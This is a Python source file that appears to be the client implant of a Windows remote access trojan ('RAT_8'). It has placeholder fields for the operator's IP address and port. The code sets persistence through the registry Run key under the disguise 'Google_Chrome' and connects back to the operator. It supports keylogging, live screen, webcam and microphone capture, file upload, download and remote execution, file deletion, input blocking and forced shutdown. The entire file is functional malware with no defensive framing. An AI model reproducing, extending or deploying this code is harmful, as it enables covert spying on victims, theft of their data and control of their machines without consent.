import socket
import sys
import os
import time
import pickle
import subprocess
import requests
from pynput.mouse import Controller
import threading
from pynput import keyboard
import string
import cv2 , mss
import numpy , winreg
import pyaudio
import time , sys , os , subprocess , playsound

ip = "%CLIENT_IP%"

port = int("%CLIENT_PORT%")

mutex = "RAT_8"

target = r"C:\Windows\Temp"
text = ""
letters = list(string.ascii_letters)
numbers = ["0" , "1" , "2" , "3" , "4" , "5" , "6" , "7" , "8" , "9"]

percorso = os.path.abspath(sys.executable)
nome = "Google_Chrome"
chiave = r"Software\Microsoft\Windows\CurrentVersion\Run"
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chiave, 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, nome, 0, winreg.REG_SZ, percorso)
winreg.CloseKey(key)


text = ""

BLOCK_M_FLAG = False

BLOCK_K_FLAG = False

KEYLOGGER_FLAG = False

SCREENSHARE_FLAG = False

MIC_FLAG = False

CAMERA_FLAG = False

def blockmouse():
    mouse = Controller()
    while True:
        if BLOCK_M_FLAG == True:
            mouse.move(1,1)
        else:
            time.sleep(4.0)

def chunk_string(input_string, chunk_size , lista):
            lista.extend([input_string[i:i + chunk_size] for i in range(0, len(input_string), chunk_size)])

parametri = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

def video_share():
    global parametri
    global stream_channel

    if SCREENSHARE_FLAG == False:
        CONSTANT_TX_VALUE = 500000
        print(stream_channel)
        stream_channel.settimeout(1.5)
        monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}
        iters = 0
        while True:
            if stream_channel == False:
                break                                        
            if stream_channel:
                print("connected")
                while stream_channel != False:                                                                             
                    buffer = []
                    try:
                        with mss.mss() as sct:
                            screen = sct.grab(monitor)
                            array  = numpy.array(screen)
                            res , frame = cv2.imencode(".jpg" , array , parametri)
                            serializ = pickle.dumps(frame)
                            chunk_string(serializ , CONSTANT_TX_VALUE , buffer)
                            if stream_channel != False:
                                stream_channel.recv(10)
                                stream_channel.sendall(pickle.dumps(len(serializ)))
                                for n in buffer:
                                    b = stream_channel.recv(10)
                                    stream_channel.sendall(n)
                                    if b.decode() == "ok":
                                        pass
                                    else:
                                        print("Desyncronized!")
                                        stream_channel.close()
                                        break
                            else:
                                break
                            iters += 1

                    except Exception as e:
                        if stream_channel == False:
                            break
                        else:
                            print("error:" , e)
                            stream_channel.close()
                            break    

def mic_share():
    global MIC_FLAG
    global mic_channel
    p = pyaudio.PyAudio()
    canale_input = p.open(format=pyaudio.paInt16 , channels= 1 , input = True , rate= 44100)
    while True:
        data = canale_input.read(1024)
        mic_channel.sendall(pickle.dumps(data))
        if MIC_FLAG == True:
            break
    



def camera_share():
    global parametri
    global camera_channel
    if CAMERA_FLAG == False:
        CONSTANT_TX_VALUE = 500000
        
        camera_channel.settimeout(1.5)
        iters = 0
        while True:
            if camera_channel == False:
                break
            camera = cv2.VideoCapture(0)

            while camera_channel != False:
                buffer = []
                try:
                
                    ret , foto = camera.read()
                    res , frame = cv2.imencode(".jpg" , foto , parametri)
                    serializ = pickle.dumps(frame)
                    chunk_string(serializ , CONSTANT_TX_VALUE , buffer)
                    camera_channel.recv(10)
                    camera_channel.sendall(pickle.dumps(len(serializ)))
                    for n in buffer:
                        b = camera_channel.recv(10)
                        camera_channel.sendall(n)
                        if b.decode() == "ok":
                            pass
                        else:
                            camera_channel.close()
                            break
                    iters += 1
                except Exception as e:
                    print("Exception")
                    print(camera_channel)
                    if camera_channel == False:
                        break
                    else:
                        print("error:" , e)
                        camera_channel.close()
                        break  

def blockkeyboard():
    while True:
        if BLOCK_K_FLAG == True:
            try:
                def on_press2(key):
                    pass
                block_key = keyboard.Listener(on_press=on_press2 , suppress= True)
                block_key.start()
            except:
                pass
        else:
            time.sleep(4.0)

t1 = threading.Thread(target = blockmouse)
t1.daemon = True
t1.start()

t2 = threading.Thread(target = blockkeyboard)
t2.daemon = True
t2.start()

def getdata(file):
    f = open(file , "rb")
    data = f.read()
    return data

def sendfile(host , datafile):
    chunks = []
    chunksize = 1000000
    try:
        chunk_string(datafile , chunksize , chunks)
        iters = len(chunks)
        print(iters)
        host.send(pickle.dumps(len(chunks)))
        chunknumber = 0
        for n in range(iters):
            host.recv(1024)
            host.sendall(chunks[chunknumber])
            chunknumber += 1
    except PermissionError:
        host.send(pickle.dumps(create_response_header("Error 2" , None)))
    except FileNotFoundError:
        host.send(pickle.dumps(create_response_header("Error 1" , None)))
    except:
        host.send(pickle.dumps(create_response_header("Error -1" , None)))

def suono(percorso):
    try:
        playsound.playsound(percorso)
        os.remove(percorso)
    except:
        pass

def recieve_file(host , header):
    file_data = b""
    print(header)
    iters = header["flag"]
    for n in range(iters):
        server.sendall(b"done")
        pezzo = host.recv(1000000)
        file_data = file_data + pezzo
    os.chdir(target)
    with open(header["object"] , "wb") as file:
        file.write(file_data)
    if header["mode"] == "Y":
        os.startfile(os.path.join(target , header["object"]))
    if header["mode"] == "Sound":
        try:
            audio_perc = os.path.join(target , header["object"])
            threading.Thread(target=suono , args=[audio_perc ,]).start()
        except:
            pass
            
        


def on_press(key):
    global text
    try:
        if KEYLOGGER_FLAG == True:
            if key == keyboard.Key.space:
                text += " "
            else:
                text += key.char
    except:
        pass
    

    
def keylogger():
    if BLOCK_K_FLAG == False:
        with keyboard.Listener(on_press=on_press) as l:
            l.join()

t2 = threading.Thread(target=keylogger)
t2.start()


def chunk_string(input_string, chunk_size , lista):
    lista.extend([input_string[i:i + chunk_size] for i in range(0, len(input_string), chunk_size)])


def create_response_header(primary , secondary):
    header = {
        "response": primary ,
        "response2": secondary
    }
    return header

ready_to_ping = False

def pinger_reciever():
    global hb
    while True:
        if ready_to_ping == True:
                hb.recv(10)
                hb.send(b"pong")
                time.sleep(2.0)
        else:
            time.sleep(0.5)


while True:
    try:
        with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as server:
            try:
                server.connect((ip , port))
                server.sendall(pickle.dumps("$client"))
                server.recv(10)
                print("success!")
                hb = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                hb.connect((ip , port))
                hb.sendall(pickle.dumps("$hb"))
                print(hb)
                ready_to_ping = True
                stream = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                stream.connect((ip , port))
                stream.sendall(pickle.dumps("$stream"))
                print(stream)
                camera = socket.socket(socket.AF_INET , socket.SOCK_STREAM)           
                camera.connect((ip , port))
                camera.sendall(pickle.dumps("$camera"))
                print(camera)
                mic_audio = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                mic_audio.connect((ip , port))
                mic_audio.sendall(pickle.dumps("$mic_audio"))
                print(mic_audio)
            except:
                pass
            while True:
                print("pronto a ricevere")
                data = server.recv(1000000)
                if data:
                    print("data ricevuta")
                    header = pickle.loads(data)
                    print(header)


                if header["prefix"] == "$dir":
                    try:
                        os.chdir(rf'{header["object"]}')
                        harne = os.listdir()
                        harne = os.linesep.join(harne)
                        server.sendall(pickle.dumps(create_response_header(harne , None)))
                    except FileNotFoundError:
                        server.sendall(pickle.dumps(create_response_header("Error 1" , None)))
                    except PermissionError:
                        server.sendall(pickle.dumps(create_response_header("Error 2 " , None)))
                    except:
                        server.sendall(pickle.dumps(create_response_header("Error -1" , None)))

                if header["prefix"] == "$run":
                    try:
                        os.startfile(header["object"])
                        server.sendall(pickle.dumps("Started with success!"))
                    except FileNotFoundError:
                        server.sendall(pickle.dumps(create_response_header("Error 1" , None)))
                    except PermissionError:
                        server.sendall(pickle.dumps(create_response_header("Error 2 " , None)))
                    except:
                        server.sendall(pickle.dumps(create_response_header("Error -1" , None)))
                

                if header["prefix"] == "$del" and os.path.exists(header["object"]) == True:
                    try:
                        os.remove(rf'{header["object"]}')
                        server.sendall(pickle.dumps("Rimosso con successo"))
                    except PermissionError:
                        server.sendall(pickle.dumps("Error 2"))
                    except FileNotFoundError:
                        server.sendall(pickle.dumps("Error 1"))


                if header["prefix"] == "$shutdown":
                    if int(header["mode"]) == 1:
                        subprocess.call("shutdown /s /f /t 0")
                    if int(header["mode"]) == 2:
                        subprocess.call("shutdown /r /f /t 0")
                        
                if header["prefix"] == "$get":
                    data_file = getdata(header["object"])
                    sendfile(server , data_file)

                if header["prefix"] == "$change_directory":
                    if os.path.exists(header["object"]):
                        try:
                            os.chdir(header["object"])
                            server.sendall(pickle.dumps(f'Target directory succesfully changed to {header["object"]}'))
                        except PermissionError:
                            server.sendall(pickle.dumps("Error 2"))
                    else:
                        server.sendall(pickle.dumps("Error 1"))

                if header["prefix"] == "$getip":
                    header = pickle.loads(data)
                    try:
                        IP = requests.get("https://checkip.amazonaws.com")
                        if IP.status_code == 200:
                            PIP = IP.text.strip()
                            PrIP = socket.gethostbyname(socket.gethostname())

                            server.sendall(pickle.dumps(create_response_header(PIP , PrIP)))
                    except:
                        server.sendall(pickle.dumps(create_response_header("Unhandeled -1" , None)))

                
                if header["prefix"] == "$send":
                    recieve_file(server , header)


                if header["prefix"] == "$netstat":
                    try:
                        deargod = subprocess.run("netstat -an" , stderr=subprocess.PIPE , stdout = subprocess.PIPE)
                        os.chdir(r"C:\Windows\Temp")
                        f = open(r"C:\Windows\Temp\netstat.txt" , mode = "w" , encoding="utf-8")
                        f.write(deargod.stdout.decode("utf-8"))
                        sendfile(server , getdata(r"C:\Windows\Temp\netstat.txt"))
                        f.close()
                    except:
                        raise

                if header["prefix"] == "$blockmouse":
                    BLOCK_M_FLAG = True
                    server.sendall(pickle.dumps("Mouse blocked"))

                if header["prefix"] == "$blockkeyboard":
                    BLOCK_K_FLAG = True
                    server.sendall(pickle.dumps("Keyboard blocked"))

                if header["prefix"] == "$unblockkeyboard":
                    BLOCK_K_FLAG = False
                    server.sendall(pickle.dumps("Keyboard blocked"))

                if header["prefix"] == "$unblockmouse":
                    BLOCK_M_FLAG = False
                    server.sendall(pickle.dumps("Mouse unblocked"))

                if header["prefix"] == "$blockkeyboard":
                    BLOCK_K_FLAG = True

                if header["prefix"] == "$startkeylogger":
                    KEYLOGGER_FLAG = True

                if header["prefix"] == "$stopkeylogger":
                    KEYLOGGER_FLAG = False
                    server.sendall(pickle.dumps(text))
                    text = ""

                if header["prefix"] == "$startstream":
                    stream_channel = stream
                    print("stream started")
                    threading.Thread(target = video_share).start()
                
                if header["prefix"] == "$stopstream":
                    stream_channel = False
                    SCREENSHARE_FLAG = False

                if header["prefix"] == "$startcamera":
                    camera_channel = camera
                    threading.Thread(target = camera_share).start()

                if header["prefix"] == "$stopcamera":
                    camera_channel = False
                    CAMERA_FLAG = False

                if header["prefix"] == "$soundboard":
                    header = pickle.loads(server.recv(1024))
                    recieve_file(server , header)
                
                if header["prefix"] == "$test":
                    data = server.recv(10000)
                    print(pickle.loads(data))

                if header["prefix"] == "$startmic":
                    mic_channel = mic_audio
                    MIC_FLAG = False
                    threading.Thread(target=mic_share).start()

                if header["prefix"] == "$stopmic":
                    MIC_FLAG = True

                    
                        

                    

    except:
        print("retrying...")
        pass